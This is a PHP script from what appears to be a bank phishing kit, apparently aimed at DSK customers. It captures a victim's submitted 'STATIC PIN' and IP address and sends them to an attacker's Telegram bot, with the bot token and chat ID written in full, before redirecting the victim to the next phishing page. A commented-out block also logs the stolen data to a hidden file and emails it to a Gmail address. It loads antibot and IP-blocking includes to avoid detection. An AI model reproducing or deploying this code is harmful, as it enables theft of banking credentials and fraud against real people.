<?php
include('antibot.php');
include('antiip.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
session_start();


$ap_vsms  = $_SESSION['_ap_vsms_']     = $_POST['vsms'];
$ip = getenv("REMOTE_ADDR");

$message = "STATIC PIN: " .$ap_vsms."  ";
$message .= "IP: ".$ip;

file_get_contents("https://api.telegram.org/bot6788401748:AAF1szjl3Y_1JyCF1MnTCmiBB9lpYgYGYRg/sendMessage?chat_id=-4064520154&text=".$message );
/*
$arr = array('funip' => $ip, 'funsms' => $ap_vsms);

$arrsend = array('funip' => $ip, 'funsms' => $ap_vsms);

$XAMZ = json_encode($arr);
$XAMZSND = json_encode($arrsend);

$file = fopen(".RzL.html","a");
fwrite($file, $XAMZ."</br>");
fclose($file);

$asba = "dskresult2021@gmail.com";
$subject  = "NEW DSKSMS OF " .$ip. " - [".$countryname."]";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:DSKREZ <dskresult2021@gmail.com>";

mail($asba, $subject, base64_encode($XAMZSND), $headers);

   */
    header("Location: vsms.php");

?>